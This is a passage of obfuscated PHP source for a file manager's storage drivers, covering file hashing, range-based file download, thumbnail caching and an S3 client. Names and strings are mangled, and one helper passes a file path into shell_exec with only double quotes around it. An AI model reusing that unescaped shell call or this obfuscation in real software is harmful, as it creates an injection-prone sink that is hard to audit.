$åœå„Ÿ… = 200; $êí¦Öóˆ = 50; if ($ûÖÍØ¬ <= $åœå„Ÿ… * $êí¦Öóˆ) { return $this->hashMd5($¯¾²¯ŞÒ) . $ûÖÍØ¬; } $“œ§÷ææ = intval($ûÖÍØ¬ / $êí¦Öóˆ); $”¼¾ğĞ„ = $Ã»¢˜¹å[12]; for ($®ÀÕæí = 0; $®ÀÕæí < $êí¦Öóˆ; $®ÀÕæí++) { $”¼¾ğĞ„ .= $this->fileSubstr($¯¾²¯ŞÒ, $“œ§÷ææ * $®ÀÕæí, $åœå„Ÿ…); } $”¼¾ğĞ„ .= $this->fileSubstr($¯¾²¯ŞÒ, $ûÖÍØ¬ - $åœå„Ÿ…, $åœå„Ÿ…); return md5($”¼¾ğĞ„) . $ûÖÍØ¬; } public static $md5Cache = array(); public function hashMd5($øşÍ”Õï) { if (!$øşÍ”Õï) { return md5($_SERVER[«òÑğ][12]); } $øşÍ”Õï = $this->iconvSystem($øşÍ”Õï); if (isset(self::$md5Cache[$øşÍ”Õï])) { return self::$md5Cache[$øşÍ”Õï]; } self::$md5Cache[$øşÍ”Õï] = $this->hashMd5Shell($øşÍ”Õï); if (!self::$md5Cache[$øşÍ”Õï]) { self::$md5Cache[$øşÍ”Õï] = @md5_file($øşÍ”Õï); } return self::$md5Cache[$øşÍ”Õï]; } private function hashMd5Shell($ä‡ûÓéñ) { $ÂÁ‡ğ˜• =& $_SERVER[«òÑğ]; if (!$ä‡ûÓéñ) { return md5($ÂÁ‡ğ˜•[12]); } if (!function_exists($ÂÁ‡ğ˜•[101])) { return !1; } $®¶ÃĞò = array($ÂÁ‡ğ˜•[102], $ÂÁ‡ğ˜•[103]); $Ê»›ôÛ¼ = Cache::get($ÂÁ‡ğ˜•[104]); if (!$Ê»›ôÛ¼) { $ªˆá¹¹Ÿ = BASIC_PATH . $ÂÁ‡ğ˜•[105]; $†¾é¥«é = md5_file($ªˆá¹¹Ÿ); $Ê»›ôÛ¼ = $ÂÁ‡ğ˜•[106]; foreach ($®¶ÃĞò as $™È¿„ƒ) { $şŒ˜âô = shell_exec($™È¿„ƒ . "\x20\42{$ªˆá¹¹Ÿ}\x22"); if ($şŒ˜âô && substr(trim($şŒ˜âô), 0, 32) == $†¾é¥«é) { $Ê»›ôÛ¼ = $™È¿„ƒ; break; } } Cache::set($ÂÁ‡ğ˜•[104], $Ê»›ôÛ¼, 3600); } if ($Ê»›ôÛ¼ == $ÂÁ‡ğ˜•[106]) { return !1; } $şŒ˜âô = shell_exec($Ê»›ôÛ¼ . "\x20\x22{$ä‡ûÓéñ}\42"); $şŒ˜âô = str_replace($ÂÁ‡ğ˜•[107], $ÂÁ‡ğ˜•[12], $şŒ˜âô); return substr($şŒ˜âô, 0, 32); } public function link($Ä—Ø°­ì) { return $Ä—Ø°­ì; } public function fileOut($ê­ƒëäÒ, $ŸÏ¯¬îÀ = false, $â¢ÓÑ›å = false, $âŒ½ıÁÀ = '') { $ÓŠ¬ú¨Ã =& $_SERVER[«òÑğ]; $this->cacheMethod(null, null); if (!$ê­ƒëäÒ || !$this->exist($ê­ƒëäÒ)) { show_json(LNG($ÓŠ¬ú¨Ã[108]), !1, $â¢ÓÑ›å); } $›—¯Ô–ù = $this->getType() == $ÓŠ¬ú¨Ã[109]; $×‡‹Ğ’ø = $GLOBALS[$ÓŠ¬ú¨Ã[6]][$ÓŠ¬ú¨Ã[92]][$ÓŠ¬ú¨Ã[110]][$ÓŠ¬ú¨Ã[111]]; $£‚ÖËêÙ = (double) $GLOBALS[$ÓŠ¬ú¨Ã[6]][$ÓŠ¬ú¨Ã[92]][$ÓŠ¬ú¨Ã[110]][$ÓŠ¬ú¨Ã[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÂÛöÖ¼æ = $this->infoFull($ê­ƒëäÒ); $³¦ÖóäÜ = $ÂÛöÖ¼æ[$ÓŠ¬ú¨Ã[79]]; $Äş® ´¼ = gmdate($ÓŠ¬ú¨Ã[113], $ÂÛöÖ¼æ[$ÓŠ¬ú¨Ã[88]]); $Ú´±ÏŞı = $â¢ÓÑ›å ? $â¢ÓÑ›å : $this->iconvApp($ÂÛöÖ¼æ[$ÓŠ¬ú¨Ã[32]]); $£µ¸Ê€Ñ = 0; $°«¸Ê¾ = $³¦ÖóäÜ - 1; $™ÊğŒÆ = $this->ext($Ú´±ÏŞı); if (in_array($™ÊğŒÆ, array($ÓŠ¬ú¨Ã[114], $ÓŠ¬ú¨Ã[115], $ÓŠ¬ú¨Ã[116], $ÓŠ¬ú¨Ã[117]))) { $™ÊğŒÆ = $ÓŠ¬ú¨Ã[118]; } if (in_array($™ÊğŒÆ, array($ÓŠ¬ú¨Ã[119]))) { $™ÊğŒÆ = $ÓŠ¬ú¨Ã[120]; } if (!$âŒ½ıÁÀ) { $âŒ½ıÁÀ = md5($Äş® ´¼ . $³¦ÖóäÜ); } $âŒ½ıÁÀ = $ÓŠ¬ú¨Ã[121] . $âŒ½ıÁÀ . $ÓŠ¬ú¨Ã[121]; $ÕÁ¡İÅ« = get_file_mime($™ÊğŒÆ); $åçê€³è = !0; $åçê€³è = isset($_GET[$ÓŠ¬ú¨Ã[122]]) ? !1 : !0; if ($ŸÏ¯¬îÀ === !1 && !mime_support($ÕÁ¡İÅ«)) { $ÕÁ¡İÅ« = $ÓŠ¬ú¨Ã[123]; } header($ÓŠ¬ú¨Ã[124]); header($ÓŠ¬ú¨Ã[125] . $ÕÁ¡İÅ«); $£ÆÍÏœø = rawurlencode($Ú´±ÏŞı); $£ÆÍÏœø = $ÓŠ¬ú¨Ã[121] . $£ÆÍÏœø . $ÓŠ¬ú¨Ã[126] . $£ÆÍÏœø; if ($ŸÏ¯¬îÀ) { header($ÓŠ¬ú¨Ã[127]); header($ÓŠ¬ú¨Ã[128] . $£ÆÍÏœø); } else { if ($åçê€³è) { header($ÓŠ¬ú¨Ã[129] . $£ÆÍÏœø); } } $¥­µÇõæ = 3600 * 24 * 30; header($ÓŠ¬ú¨Ã[130]); header($ÓŠ¬ú¨Ã[131]); header($ÓŠ¬ú¨Ã[132] . $¥­µÇõæ); header($ÓŠ¬ú¨Ã[133] . gmdate($ÓŠ¬ú¨Ã[113], time() + $¥­µÇõæ) . $ÓŠ¬ú¨Ã[134]); if (isset($_SERVER[$ÓŠ¬ú¨Ã[135]]) && strtotime($_SERVER[$ÓŠ¬ú¨Ã[135]]) == $ÂÛöÖ¼æ[$ÓŠ¬ú¨Ã[88]]) { header($ÓŠ¬ú¨Ã[136], !0, 304); die; } if (isset($_SERVER[$ÓŠ¬ú¨Ã[137]]) && $_SERVER[$ÓŠ¬ú¨Ã[137]] == $âŒ½ıÁÀ) { header($ÓŠ¬ú¨Ã[138] . $âŒ½ıÁÀ, !0, 304); die; } header($ÓŠ¬ú¨Ã[138] . $âŒ½ıÁÀ); header($ÓŠ¬ú¨Ã[139] . $Äş® ´¼ . $ÓŠ¬ú¨Ã[134]); header($ÓŠ¬ú¨Ã[140] . $Ú´±ÏŞı); header($ÓŠ¬ú¨Ã[141]); header($ÓŠ¬ú¨Ã[142] . $³¦ÖóäÜ); header($ÓŠ¬ú¨Ã[143]); Hook::trigger($ÓŠ¬ú¨Ã[144], $ê­ƒëäÒ, $³¦ÖóäÜ, $Ú´±ÏŞı, $™ÊğŒÆ); if (!$ŸÏ¯¬îÀ && $™ÊğŒÆ == $ÓŠ¬ú¨Ã[145]) { if ($³¦ÖóäÜ > 1024 * 1024 * 5) { die; } $ìÂ¦¹Ó× = $this->getContent($ê­ƒëäÒ); $ìÂ¦¹Ó× = Html::clearSVG($ìÂ¦¹Ó×); header($ÓŠ¬ú¨Ã[146] . strlen($ìÂ¦¹Ó×)); echo $ìÂ¦¹Ó×; die; } $Ç¶…ĞÃ = strtolower($_SERVER[$ÓŠ¬ú¨Ã[147]]); if ($›—¯Ô–ù && $Ç¶…ĞÃ && $×‡‹Ğ’ø) { if (strstr($Ç¶…ĞÃ, $ÓŠ¬ú¨Ã[148])) { header($ÓŠ¬ú¨Ã[149] . $ê­ƒëäÒ); } else { if (strstr($Ç¶…ĞÃ, $ÓŠ¬ú¨Ã[150])) { header($ÓŠ¬ú¨Ã[151] . $ê­ƒëäÒ); } else { if (strstr($Ç¶…ĞÃ, $ÓŠ¬ú¨Ã[152])) { header($ÓŠ¬ú¨Ã[153] . $ê­ƒëäÒ); } } } if ($£‚ÖËêÙ) { header($ÓŠ¬ú¨Ã[154] . $£‚ÖËêÙ); } return; } if (isset($_SERVER[$ÓŠ¬ú¨Ã[155]])) { if (preg_match($ÓŠ¬ú¨Ã[156], $_SERVER[$ÓŠ¬ú¨Ã[155]], $İÊ¤¤Ùä)) { $£µ¸Ê€Ñ = intval($İÊ¤¤Ùä[1]); $£µ¸Ê€Ñ = $£µ¸Ê€Ñ <= 0 ? 0 : ($£µ¸Ê€Ñ >= $°«¸Ê¾ ? $°«¸Ê¾ : $£µ¸Ê€Ñ); if (!empty($İÊ¤¤Ùä[2])) { $Şì‚ÜÇ° = intval($İÊ¤¤Ùä[2]); $°«¸Ê¾ = $Şì‚ÜÇ° < $£µ¸Ê€Ñ ? $£µ¸Ê€Ñ : ($Şì‚ÜÇ° >= $°«¸Ê¾ ? $°«¸Ê¾ : $Şì‚ÜÇ°); } } header($ÓŠ¬ú¨Ã[157]); header("\103\157\156\x74\145\156\164\x2d\122\141\156\147\145\72\40\x62\x79\164\145\x73\x20{$£µ¸Ê€Ñ}\x2d{$°«¸Ê¾}\57" . $³¦ÖóäÜ); } else { header($ÓŠ¬ú¨Ã[158]); } header($ÓŠ¬ú¨Ã[159]); header($ÓŠ¬ú¨Ã[160]); $Ä –—ˆı = !0; if ($_SERVER[$ÓŠ¬ú¨Ã[161]] == $ÓŠ¬ú¨Ã[162] && $³¦ÖóäÜ > 1204 * 1024 * 1024 * 2) { $Ä –—ˆı = !1; } if ($Ä –—ˆı) { header($ÓŠ¬ú¨Ã[163] . ($°«¸Ê¾ - $£µ¸Ê€Ñ + 1)); } if ($_SERVER[$ÓŠ¬ú¨Ã[164]] == $ÓŠ¬ú¨Ã[165]) { return; } $˜¦îØ‡‡ = array($ÓŠ¬ú¨Ã[166] => !1, $ÓŠ¬ú¨Ã[167] => $£µ¸Ê€Ñ, $ÓŠ¬ú¨Ã[168] => $°«¸Ê¾, $ÓŠ¬ú¨Ã[169] => $™ÊğŒÆ, $ÓŠ¬ú¨Ã[170] => $ÂÛöÖ¼æ, $ÓŠ¬ú¨Ã[171] => $ÓŠ¬ú¨Ã[12], $ÓŠ¬ú¨Ã[172] => 0); $˜¦îØ‡‡ = Hook::filter($ÓŠ¬ú¨Ã[173], $˜¦îØ‡‡); $ªÌÈÀ½Ñ = 1024 * 300; $½¶¢çè = 0; if ($£‚ÖËêÙ) { $½¶¢çè = intval(1000 * 1000 * ($ªÌÈÀ½Ñ / $£‚ÖËêÙ)); } while ($£µ¸Ê€Ñ <= $°«¸Ê¾) { $­À´è = timeFloat(); check_abort(); $Šä»±úó = $°«¸Ê¾ - $£µ¸Ê€Ñ + 1; if ($Šä»±úó <= $ªÌÈÀ½Ñ) { $ªÌÈÀ½Ñ = $Šä»±úó; } $ìÂ¦¹Ó× = $this->fileSubstr($ê­ƒëäÒ, $£µ¸Ê€Ñ, $ªÌÈÀ½Ñ); if ($˜¦îØ‡‡[$ÓŠ¬ú¨Ã[166]]) { $˜¦îØ‡‡[$ÓŠ¬ú¨Ã[171]] = $ìÂ¦¹Ó×; $˜¦îØ‡‡[$ÓŠ¬ú¨Ã[172]] = $£µ¸Ê€Ñ; $˜¦îØ‡‡ = Hook::filter($ÓŠ¬ú¨Ã[174], $˜¦îØ‡‡); $ìÂ¦¹Ó× = $˜¦îØ‡‡[$ÓŠ¬ú¨Ã[171]]; } echo $ìÂ¦¹Ó×; $£µ¸Ê€Ñ += $ªÌÈÀ½Ñ; if ($ªÌÈÀ½Ñ == $Šä»±úó) { $£µ¸Ê€Ñ = $°«¸Ê¾ + 1; } if ($½¶¢çè) { $¯Ü‹òÆ = intval(1000 * 1000 * (timeFloat() - $­À´è)); $¡ô×·î = $½¶¢çè - $¯Ü‹òÆ; if ($¡ô×·î > 5) { usleep($¡ô×·î); } } } } public function fileOutServer($ŸË–ù¤Ù, $¡Éí’² = false, $çîÕ…±² = false, $À·ô›º— = '') { $this->fileOut($ŸË–ù¤Ù, $¡Éí’², $çîÕ…±², $À·ô›º—); } public function fileOutLink($¶áß©ãÆ) { header($_SERVER[«òÑğ][175] . $¶áß©ãÆ); die; } public function cacheMethod($ÓÒÓ¤¥, $›ÌúÉìª, $Ï¼®š»¯ = null) { $‚Ññøí† =& $_SERVER[«òÑğ]; static $—í¢•º³ = array(); $¬ÓŸ•„¬ = $›ÌúÉìª ? ltrim($this->getPathOuter($›ÌúÉìª), $‚Ññøí†[8]) : $‚Ññøí†[12]; $¢º¨Ûùó = $‚Ññøí†[176] . $ÓÒÓ¤¥ . $‚Ññøí†[177] . rtrim($¬ÓŸ•„¬, $‚Ññøí†[8]); if (is_null($ÓÒÓ¤¥)) { $—í¢•º³ = array(); return; } if (is_null($›ÌúÉìª)) { foreach ($—í¢•º³ as $¢º¨Ûùó => $”ÈÇ£ô‹) { if (!strstr($¢º¨Ûùó, $‚Ññøí†[176] . $ÓÒÓ¤¥ . $‚Ññøí†[178])) { continue; } unset($—í¢•º³[$¢º¨Ûùó]); } return; } if ($Ï¼®š»¯ === $‚Ññøí†[179]) { unset($—í¢•º³[$¢º¨Ûùó]); return; } if (!is_null($Ï¼®š»¯)) { $—í¢•º³[$¢º¨Ûùó] = $Ï¼®š»¯; return; } $ş¾¿å¥ú = isset($—í¢•º³[$¢º¨Ûùó]) ? $—í¢•º³[$¢º¨Ûùó] : null; if (!is_null($ş¾¿å¥ú)) { return $ş¾¿å¥ú; } $ş¾¿å¥ú = $this->{$ÓÒÓ¤¥}($›ÌúÉìª); $—í¢•º³[$¢º¨Ûùó] = $ş¾¿å¥ú; return $ş¾¿å¥ú; } public function cacheMethodInfoSet($¸”³ˆç, $’ı‰‘’, $«éâ’ù³ = false) { $ˆ·…»ßü =& $_SERVER[«òÑğ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ˆ·…»ßü[180], $¸”³ˆç, $’ı‰‘’); $this->cacheMethod($ˆ·…»ßü[181], $¸”³ˆç, $’ı‰‘’ ? !1 : !0); if (is_array($«éâ’ù³)) { $this->cacheMethod($ˆ·…»ßü[182], $¸”³ˆç, $«éâ’ù³); } } public function fileOutImage($×÷Â¨, $´€òä× = 250) { $Ì†ÕòÕ¦ =& $_SERVER[«òÑğ]; set_timeout(); if (substr($×÷Â¨, 0, 4) == $Ì†ÕòÕ¦[152]) { $this->fileOutLink($×÷Â¨); } $âìß¼´µ = $this->info($×÷Â¨); $Å¸¦¼É = !1; $¬ŒåÛÜù = isset($GLOBALS[$Ì†ÕòÕ¦[183]]) ? $GLOBALS[$Ì†ÕòÕ¦[183]] : array(); if ($¬ŒåÛÜù && $¬ŒåÛÜù[$Ì†ÕòÕ¦[184]] == $âìß¼´µ[$Ì†ÕòÕ¦[87]]) { $âìß¼´µ = $¬ŒåÛÜù; $¸¸È£Ùê = $âìß¼´µ[$Ì†ÕòÕ¦[185]]; if ($¸¸È£Ùê && isset($¸¸È£Ùê[$Ì†ÕòÕ¦[186]])) { if ($¸¸È£Ùê[$Ì†ÕòÕ¦[186]] <= $´€òä× && $¸¸È£Ùê[$Ì†ÕòÕ¦[187]] <= $´€òä×) { $Å¸¦¼É = !0; } } } if ($âìß¼´µ[$Ì†ÕòÕ¦[79]] <= 1024 * 50 || $Å¸¦¼É || !function_exists($Ì†ÕòÕ¦[188]) || $âìß¼´µ[$Ì†ÕòÕ¦[169]] == $Ì†ÕòÕ¦[189]) { return $this->fileOut($×÷Â¨, !1, $âìß¼´µ[$Ì†ÕòÕ¦[32]]); } $Æ÷ƒ’ù = kodIO::hashPath($âìß¼´µ); $äÈì¬ïÊ = "\143\x6f\166\145\x72\x5f{$Æ÷ƒ’ù}\137{$´€òä×}\x2e\160\156\x67"; $×¥µ†ÉÀ = IO_PATH_SYSTEM_TEMP . $Ì†ÕòÕ¦[190]; $çüµ­Œ÷ = IO::infoFullSimple($×¥µ†ÉÀ); $ºÀû«ˆ = $çüµ­Œ÷ && is_array($çüµ­Œ÷) ? $çüµ­Œ÷[$Ì†ÕòÕ¦[87]] : $Ì†ÕòÕ¦[12]; if (!$ºÀû«ˆ) { $ºÀû«ˆ = IO::mkdir($×¥µ†ÉÀ); } if ($âìß¼´µ[$Ì†ÕòÕ¦[191]] == $Ì†ÕòÕ¦[192] && isset($âìß¼´µ[$Ì†ÕòÕ¦[193]]) && $âìß¼´µ[$Ì†ÕòÕ¦[193]] == kodIO::sourceID($ºÀû«ˆ)) { $êˆ•öĞ = $âìß¼´µ[$Ì†ÕòÕ¦[194]]; if ($´€òä× <= 500) { $¼…Íö‰â = preg_replace($Ì†ÕòÕ¦[195], $Ì†ÕòÕ¦[196], $âìß¼´µ[$Ì†ÕòÕ¦[32]]); $êˆ•öĞ = IO::fileNameExist($ºÀû«ˆ, $¼…Íö‰â); } return IO::fileOut(KodIO::make($êˆ•öĞ), !1, $âìß¼´µ[$Ì†ÕòÕ¦[32]]); } $Ğæ€ä™Ë = IO::fileNameExist($ºÀû«ˆ, $äÈì¬ïÊ); if ($Ğæ€ä™Ë) { return IO::fileOut(KodIO::make($Ğæ€ä™Ë), !1, $âìß¼´µ[$Ì†ÕòÕ¦[32]]); } if ($´€òä× > 1000) { $this->makeImageCover($ºÀû«ˆ, $×÷Â¨, $äÈì¬ïÊ, $´€òä×); $this->makeImageCover($ºÀû«ˆ, $×÷Â¨, "\x63\157\166\x65\x72\137{$Æ÷ƒ’ù}\137\62\x35\60\x2e\160\x6e\147", 250); $Ğæ€ä™Ë = IO::fileNameExist($ºÀû«ˆ, $äÈì¬ïÊ); if ($Ğæ€ä™Ë) { return IO::fileOut(KodIO::make($Ğæ€ä™Ë), !1, $âìß¼´µ[$Ì†ÕòÕ¦[32]]); } die; } if (!kodIO::allowCover($âìß¼´µ)) { return $this->fileOut($×÷Â¨, !1, $âìß¼´µ[$Ì†ÕòÕ¦[32]]); } $ú»­¿ = Cache::get($äÈì¬ïÊ); if ($ú»­¿ == $Ì†ÕòÕ¦[197] || $ú»­¿ == $Ì†ÕòÕ¦[198]) { echo $ú»­¿; die; } Cache::set($äÈì¬ïÊ, $Ì†ÕòÕ¦[198], 60); $¯ÅÜ©´Ó = array($ºÀû«ˆ, $âìß¼´µ[$Ì†ÕòÕ¦[87]], $äÈì¬ïÊ, $´€òä×); $‰«œÃ¿• = $Ì†ÕòÕ¦[199] . $âìß¼´µ[$Ì†ÕòÕ¦[79]] . $Ì†ÕòÕ¦[200] . $äÈì¬ïÊ . $Ì†ÕòÕ¦[201] . $âìß¼´µ[$Ì†ÕòÕ¦[32]] . $Ì†ÕòÕ¦[202] . $âìß¼´µ[$Ì†ÕòÕ¦[87]]; TaskQueue::add($Ì†ÕòÕ¦[203], $¯ÅÜ©´Ó, $‰«œÃ¿•, $äÈì¬ïÊ); } public function makeImageCover($ßİÂ„ƒ, $†âÊŠ, $³²¯¿ù©, $ƒ¡ÎéÆ¶) { $§ÚÃÑğš =& $_SERVER[«òÑğ]; if (IO::fileNameExist($ßİÂ„ƒ, $³²¯¿ù©)) { return $§ÚÃÑğš[204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Ù«ìğ›° = $this->getPathOuter($†âÊŠ); $ïº‹×¨ = DATA_THUMB . $³²¯¿ù©; del_file($ïº‹×¨); $õ÷Êïêµ = IO::copy($Ù«ìğ›°, TEMP_FILES, !1, $³²¯¿ù©); if (!@file_exists($õ÷Êïêµ)) { return $§ÚÃÑğš[205]; } ImageThumb::createThumb($õ÷Êïêµ, $ïº‹×¨, $ƒ¡ÎéÆ¶, $ƒ¡ÎéÆ¶ * 10); if (@file_exists($ïº‹×¨)) { Cache::remove($³²¯¿ù©); return IO::move($ïº‹×¨, $ßİÂ„ƒ); } Cache::set($³²¯¿ù©, $§ÚÃÑğš[197], 600); del_file($ïº‹×¨); return $§ÚÃÑğš[206] . $õ÷Êïêµ . $§ÚÃÑğš[74]; } public function fileOutImageServer($è”Í¡Ë, $×§Ò¬ÍÆ = 250) { $this->fileOutImage($è”Í¡Ë, $×§Ò¬ÍÆ); } public function fileNameAuto($’èÁè´¨, $¥ˆüš, $ÜÑÍÏ·æ = REPEAT_RENAME, $³µùŠ·— = false) { $éí’—¢¡ =& $_SERVER[«òÑğ]; $ÙèíÖÚÜ = $’èÁè´¨ === $éí’—¢¡[12] ? $¥ˆüš : rtrim($’èÁè´¨, $éí’—¢¡[8]) . $éí’—¢¡[8] . $¥ˆüš; if ($ÜÑÍÏ·æ == REPEAT_REPLACE || !$this->exist($ÙèíÖÚÜ) || $³µùŠ·— && $ÜÑÍÏ·æ != REPEAT_RENAME_FOLDER) { return $¥ˆüš; } if ($ÜÑÍÏ·æ == REPEAT_SKIP) { return !1; } $„Áßàö = $éí’—¢¡[10] . get_path_ext($¥ˆüš); $„Áßàö = $„Áßàö == $éí’—¢¡[10] || $³µùŠ·— ? $éí’—¢¡[12] : $„Áßàö; $è€…Í = 1; $ñÚë†¿Ç = substr($¥ˆüš, 0, strlen($¥ˆüš) - strlen($„Áßàö)); $»Ä‰ñ¦ = $ñÚë†¿Ç . "\50{$è€…Í}\51{$„Áßàö}"; while ($this->exist(rtrim($’èÁè´¨, $éí’—¢¡[8]) . $éí’—¢¡[8] . $»Ä‰ñ¦)) { $»Ä‰ñ¦ = $ñÚë†¿Ç . "\50{$è€…Í}\x29{$„Áßàö}"; $è€…Í++; } return $»Ä‰ñ¦; } private function fileNameAutoList($Ù¼òŞ»ş, $ğ‚Ãš¤¶, $š€Âıõ¯ = false) { $ğ÷ëÕË„ =& $_SERVER[«òÑğ]; $îú‡ºˆÖ = $this->listPath($Ù¼òŞ»ş, !0); $îú‡ºˆÖ = array_merge($îú‡ºˆÖ[$ğ÷ëÕË„[85]], $îú‡ºˆÖ[$ğ÷ëÕË„[86]]); $Ëó±¢’ò = array_to_keyvalue($îú‡ºˆÖ, $ğ÷ëÕË„[12], $ğ÷ëÕË„[32]); $ïÇ€Æò = $ğ÷ëÕË„[10] . get_path_ext($ğ‚Ãš¤¶); $ïÇ€Æò = $ïÇ€Æò == $ğ÷ëÕË„[10] || $š€Âıõ¯ ? $ğ÷ëÕË„[12] : $ïÇ€Æò; $à±î·£ = substr($ğ‚Ãš¤¶, 0, strlen($ğ‚Ãš¤¶) - strlen($ïÇ€Æò)); $Ø¤öåÎ = $à±î·£ . "\x28\x30\x29{$ïÇ€Æò}"; for ($£÷€“—ğ = 1; $£÷€“—ğ <= count($Ëó±¢’ò) + 1; $£÷€“—ğ++) { $Ø¤öåÎ = $à±î·£ . "\50{$£÷€“—ğ}\51{$ïÇ€Æò}"; if (!in_array_not_case($Ø¤öåÎ, $Ëó±¢’ò)) { return $Ø¤öåÎ; } } return $Ø¤öåÎ; } public function listAllFiles($Ôºš¾»Ÿ, $…«˜úÍå) { $ùå³ÚÚå =& $_SERVER[«òÑğ]; if (empty($…«˜úÍå)) { return array(); } $ï¸»º» = array_keys($…«˜úÍå); $Â—±ÖÛ¤ = array(); $Ôºš¾»Ÿ = trim($Ôºš¾»Ÿ, $ùå³ÚÚå[8]); foreach ($…«˜úÍå as $Öª…àí => $›Ôøä™») { $¶û¾öÜ = ltrim(substr(trim($Öª…àí, $ùå³ÚÚå[8]), strlen($Ôºš¾»Ÿ)), $ùå³ÚÚå[8]); if (substr($Öª…àí, -1) == $ùå³ÚÚå[8]) { $¶û¾öÜ = rtrim($¶û¾öÜ, $ùå³ÚÚå[8]) . $ùå³ÚÚå[8]; } $Â—±ÖÛ¤ = array_merge($Â—±ÖÛ¤, $this->slicePath($¶û¾öÜ)); } $üïó‰•¿ = array(); foreach (array_unique($Â—±ÖÛ¤) as $¡ê›Û×Ê) { $’ÃÍôÅÛ = array($ùå³ÚÚå[87] => $this->getPathOuter($ùå³ÚÚå[8] . $Ôºš¾»Ÿ . $ùå³ÚÚå[8] . $¡ê›Û×Ê), $ùå³ÚÚå[78] => 1, $ùå³ÚÚå[79] => 0); if (substr($¡ê›Û×Ê, -1) != $ùå³ÚÚå[8]) { $’ÃÍôÅÛ[$ùå³ÚÚå[78]] = 0; $Í»ÙáÉè = $this->getPath($Ôºš¾»Ÿ . $ùå³ÚÚå[8] . $¡ê›Û×Ê); if (isset($…«˜úÍå[$Í»ÙáÉè])) { $ÅŸ´‚ßÁ = $…«˜úÍå[$Í»ÙáÉè]; if (isset($ÅŸ´‚ßÁ[$ùå³ÚÚå[79]])) { $’ÃÍôÅÛ[$ùå³ÚÚå[79]] = intval($ÅŸ´‚ßÁ[$ùå³ÚÚå[79]]); } if (isset($ÅŸ´‚ßÁ[$ùå³ÚÚå[207]])) { $’ÃÍôÅÛ[$ùå³ÚÚå[88]] = intval($ÅŸ´‚ßÁ[$ùå³ÚÚå[207]]); } } } $üïó‰•¿[] = $’ÃÍôÅÛ; } return $üïó‰•¿; } public function slicePath($‹¯òè»¡) { $ò—‡ÖŒĞ =& $_SERVER[«òÑğ]; $ˆ€Öğ¾ = explode($ò—‡ÖŒĞ[8], trim($‹¯òè»¡, $ò—‡ÖŒĞ[8])); $óØ×”×Š = 0; do { ++$óØ×”×Š; $Ç°£¬ø[] = implode($ò—‡ÖŒĞ[8], array_slice($ˆ€Öğ¾, 0, $óØ×”×Š)) . $ò—‡ÖŒĞ[8]; } while ($óØ×”×Š < count($ˆ€Öğ¾)); $Ç°£¬ø[count($ˆ€Öğ¾) - 1] = $‹¯òè»¡; return $Ç°£¬ø; } public function getHost() { $ïÜ•È©ã =& $_SERVER[«òÑğ]; $Ú³¯ÒÜÇ = parse_url(trim($this->domain, $ïÜ•È©ã[8])); $º™ÑØæ = isset($Ú³¯ÒÜÇ[$ïÜ•È©ã[208]]) ? $Ú³¯ÒÜÇ[$ïÜ•È©ã[208]] : http_type(); $¡Í„õ­Ù = isset($Ú³¯ÒÜÇ[$ïÜ•È©ã[209]]) ? $Ú³¯ÒÜÇ[$ïÜ•È©ã[209]] : $Ú³¯ÒÜÇ[$ïÜ•È©ã[87]]; if (isset($Ú³¯ÒÜÇ[$ïÜ•È©ã[210]])) { $¡Í„õ­Ù .= $ïÜ•È©ã[4] . $Ú³¯ÒÜÇ[$ïÜ•È©ã[210]]; } return $º™ÑØæ . $ïÜ•È©ã[211] . $¡Í„õ­Ù; } public function pathEncode($³Éâ®ØÏ) { $ÈûˆƒÄ =& $_SERVER[«òÑğ]; return str_replace($ÈûˆƒÄ[212], $ÈûˆƒÄ[8], rawurlencode($³Éâ®ØÏ)); } public function writeLog($ÎÄ®™ö¾ = '', $ÃÇ‡ › = false) { $£¼ŸœŠö =& $_SERVER[«òÑğ]; $ŠˆÀ–Òø = in_array(ACTION, array($£¼ŸœŠö[213], $£¼ŸœŠö[214])); if (!$ŠˆÀ–Òø && !GLOBAL_DEBUG) { return; } $Ø“©Ø“Å = $ÎÄ®™ö¾; static $ÌÉìàİŒ = null; if (!$ÌÉìàİŒ) { $ÌÉìàİŒ = strtoupper($this->getType()); } $ÎÄ®™ö¾ = $ÌÉìàİŒ . $£¼ŸœŠö[215] . $ÎÄ®™ö¾; if ($ÃÇ‡ ›) { $îÛÌ¥¼î = error_get_last(); if ($îÛÌ¥¼î) { $ÎÄ®™ö¾ = array($ÎÄ®™ö¾, $îÛÌ¥¼î); } } write_log($ÎÄ®™ö¾, $£¼ŸœŠö[216]); if ($ŠˆÀ–Òø) { throw new Exception($Ø“©Ø“Å); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ßÃ­°¿) { set_timeout(); require_once SDK_DIR . $_SERVER[«òÑğ][217]; parent::__construct(); $this->_init($ßÃ­°¿); } public function _init($ú¦ç‹Ğë) { $êıĞ¬µó =& $_SERVER[«òÑğ]; $this->config = $ú¦ç‹Ğë; foreach ($ú¦ç‹Ğë as $¶‰—ş¯ => $õ€¹ï¶) { if (isset($this->{$¶‰—ş¯})) { $this->{$¶‰—ş¯} = $õ€¹ï¶; } } $this->endpoint = $ú¦ç‹Ğë[$êıĞ¬µó[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $áˆÙ·ò = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($áˆÙ·ò, 0, 7) == $êıĞ¬µó[219]) { $áˆÙ·ò = $êıĞ¬µó[220] . substr($áˆÙ·ò, 7); } $this->client->setEndpoint($áˆÙ·ò); if (in_array(ACTION, array($êıĞ¬µó[213], $êıĞ¬µó[214]))) { $this->client->setExceptions(); } } public function setSignVersion($üÇ¶ÜÆ¡ = "\x76\64") { $this->signVer = $üÇ¶ÜÆ¡; $this->client->setSignVersion($üÇ¶ÜÆ¡); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $–¢èı’) { return null; } } public function isBucketCors() { $îµ«ÌËÅ =& $_SERVER[«òÑğ]; $Õ­ù±é = $this->getBucketCors(); if (!$Õ­ù±é || !is_array($Õ­ù±é)) { return !1; } if (!is_array($Õ­ù±é[$îµ«ÌËÅ[221]])) { 